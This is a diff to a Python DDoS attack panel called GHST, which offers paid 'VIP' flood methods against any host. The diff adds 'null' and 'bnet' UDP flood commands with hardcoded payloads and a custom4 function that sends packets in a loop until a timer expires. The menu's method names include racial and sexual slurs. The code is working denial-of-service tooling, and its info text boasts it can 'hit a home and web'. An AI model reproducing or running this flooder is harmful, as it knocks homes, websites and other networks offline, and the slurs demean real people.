@@ -19,7 +19,7 @@ def modifications():
 #column:65
 method = """\033[91m
 ╔════════════════════════════════════════════════════════╗
-║                      \033[00mDDOS   METHODS\033[91m                    ║               
+║                      \033[00mM E T H O D S\033[91m                     ║               
 ║════════════════════════════════════════════════════════║
 ║═══════════════════════VIP═METHODS══════════════════════║
 ║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m UDP   ATTACK\033[91m ║
@@ -29,13 +29,17 @@ method = """\033[91m
 ║ \033[00mRAPE <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
 ║ \033[00mCOON <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
 ║ \033[00mSLPR <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
+║ \033[00mBNET <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m USE INFO CMD\033[91m ║
+║ \033[00mNULL <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
 ║═══════════════════════FREE═METHOD══════════════════════║              
 ║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m  |\033[00m SYN  ATTACK\033[91m   ║
 ╚════════════════════════════════════════════════════════╝\033[00m
 """
  
 info = """
-[ ghstinfo ] welcome to the new net with little power bit still enough to hit a home and web"""
+[ ghstinfo ] welcome to the new net with little power bit still enough to hit a home and web
+[ ghstinfo ] bnet info: it kills botnets quite well
+[ ghstinfo ] all cslap, cnuke, bnet methods are custom"""
  
 version = "3.2"
  
@@ -190,6 +194,24 @@ def custom3(host, port, timer, payload):
  
     timeout = time.time() + float(timer)
     sock = socket.socket(socket.AF_INET, socket.IPPROTO_TCP)
+    
+    said += 1
+    aid += 1
+    tattacks += 1
+    while time.time() < timeout and udp and attack:
+        sock.sendto(payload, (host, int(port)))
+    said -= 1
+    aid -= 1
+
+def custom4(host, port, timer, payload):
+    global uaid
+    global udp
+    global aid
+    global tattacks
+    global said
+ 
+    timeout = time.time() + float(timer)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     said += 1
     aid += 1
@@ -482,6 +504,24 @@ def main():
                 except socket.gaierror:
                     print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                     main()
+        elif sinput == "null":
+            if username == "guest":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
+                main()
+            else:
+                try:
+                    sinput, host, port, timer = sin.split(" ")
+                    socket.gethostbyname(host)
+                    print ("NULL: Attack sent to: {}".format (host))
+                    payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
+                    #punch = random._urandom(int(pack))
+                    threading.Thread(target=custom4, args=(host, port, timer, payload)).start()
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
         elif sinput == "tcp":
             if username == "guest":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
@@ -512,6 +552,24 @@ def main():
                     print ("SLPR: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
                     threading.Thread(target=custom2, args=(host, port, timer, punch)).start()
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
+        elif sinput == "bnet":
+            if username == "guest":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
+                main()
+            else:
+                try:
+                    sinput, host, port, timer = sin.split(" ")
+                    socket.gethostbyname(host)
+                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
+                    print ("BNET: Attack sent to: {}".format (host))
+                    
+                    threading.Thread(target=custom4, args=(host, port, timer, payload)).start()
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
